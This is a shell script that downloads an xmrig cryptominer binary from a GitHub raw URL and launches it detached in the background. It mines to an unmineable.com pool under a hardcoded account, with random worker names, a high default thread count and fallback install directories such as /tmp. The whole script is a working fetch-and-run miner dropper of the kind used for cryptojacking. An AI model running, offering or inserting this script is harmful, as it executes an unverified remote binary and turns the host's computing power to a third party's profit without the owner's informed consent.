#!/bin/sh
set -eu

PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin${PATH:+:$PATH}"
export PATH
umask 077

fail()
{
    echo "$*" >&2
    exit 1
}

XMRIG_URL="https://github.com/alvin3y/lov-remote/raw/refs/heads/main/xmrig"
THREADS="${1:-${THREADS:-64}}"

case "$THREADS" in
    ''|*[!0-9]*|0) echo "threads must be a positive integer" >&2; exit 2 ;;
esac

if [ -n "${XMRIG_DIR:-}" ]; then
    INSTALL_DIR="$XMRIG_DIR"
    case "$INSTALL_DIR" in
        /*) ;;
        *) fail "XMRIG_DIR must be an absolute path" ;;
    esac
else
    INSTALL_DIR=
    USER_ID="$(id -u 2>/dev/null || echo "$$")"

    for BASE_DIR in "${XDG_DATA_HOME:-}" "${HOME:-}" "${TMPDIR:-}" /var/tmp /tmp; do
        [ -n "$BASE_DIR" ] || continue
        case "$BASE_DIR" in
            /*) ;;
            *) continue ;;
        esac
        case "$BASE_DIR" in
            "${HOME:-}") CANDIDATE="$BASE_DIR/.local/share/unmineable-xmrig" ;;
            *) CANDIDATE="${BASE_DIR%/}/unmineable-xmrig-$USER_ID" ;;
        esac

        if mkdir -p "$CANDIDATE" 2>/dev/null && [ -w "$CANDIDATE" ]; then
            INSTALL_DIR="$CANDIDATE"
            break
        fi
    done
fi

[ -n "$INSTALL_DIR" ] || fail "no writable install directory found"
mkdir -p "$INSTALL_DIR" || fail "cannot create $INSTALL_DIR"
INSTALL_DIR="$(CDPATH= cd "$INSTALL_DIR" && pwd -P)" || fail "cannot access $INSTALL_DIR"

XMRIG="$INSTALL_DIR/xmrig"
LOG_FILE="$INSTALL_DIR/xmrig.log"
TEMP_XMRIG="$XMRIG.download.$$"
trap '[ -z "${TEMP_XMRIG:-}" ] || rm -f "$TEMP_XMRIG"' EXIT
trap 'exit 129' HUP
trap 'exit 130' INT
trap 'exit 143' TERM

if command -v curl >/dev/null 2>&1; then
    curl -fsSL --retry 3 --connect-timeout 15 "$XMRIG_URL" -o "$TEMP_XMRIG"
elif command -v wget >/dev/null 2>&1; then
    wget -q --tries=3 --timeout=15 "$XMRIG_URL" -O "$TEMP_XMRIG"
else
    fail "curl or wget is required"
fi

[ -s "$TEMP_XMRIG" ] || fail "xmrig download was empty"
chmod 700 "$TEMP_XMRIG"
"$TEMP_XMRIG" --version >/dev/null 2>&1 ||
    fail "the supplied xmrig is incompatible with this OS, CPU, or filesystem"
mv "$TEMP_XMRIG" "$XMRIG"
TEMP_XMRIG=

if [ -r /dev/urandom ] &&
    command -v od >/dev/null 2>&1 &&
    command -v tr >/dev/null 2>&1
then
    WORKER="worker-$(od -An -N6 -tx1 /dev/urandom | tr -d '[:space:]')"
else
    WORKER="worker-$(date +%s 2>/dev/null || echo 0)-$$"
fi

POOL="${POOL:-rx.unmineable.com:3333}"
if [ "$POOL" = "rx.unmineable.com:3333" ] &&
    command -v getent >/dev/null 2>&1 &&
    ! getent ahostsv4 rx.unmineable.com >/dev/null 2>&1 &&
    getent ahostsv4 rx-us.unmineable.com >/dev/null 2>&1
then
    POOL="rx-us.unmineable.com:3333"
fi

echo "Starting detached $WORKER with $THREADS thread(s)"

(
    cd "$INSTALL_DIR"
    "$XMRIG" \
        -o "$POOL" \
        -a rx \
        -k \
        -u "alvin3y1.$WORKER" \
        -p x \
        -t "$THREADS" \
        --ipv4 \
        --background \
        --log-file="$LOG_FILE" \
        --no-color
) </dev/null >/dev/null 2>&1
